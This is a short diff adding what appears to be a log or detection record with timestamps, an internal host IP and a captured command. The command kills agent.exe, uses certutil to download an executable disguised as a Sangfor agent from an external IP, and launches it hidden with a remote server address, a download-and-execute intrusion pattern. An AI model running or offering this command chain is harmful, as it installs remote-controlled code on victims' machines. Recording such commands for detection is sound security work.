@@ -1,0 +1,7 @@
+[occurTime]
+2022-03-18 16:45:42
+2022-03-18 16:46:23
+[hostIp]
+192.168.0.95
+[pCommand]
+taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 2f9c7075-ec33-4a29-901a-8e383f395763 -server https://124.223.85.207:8443"
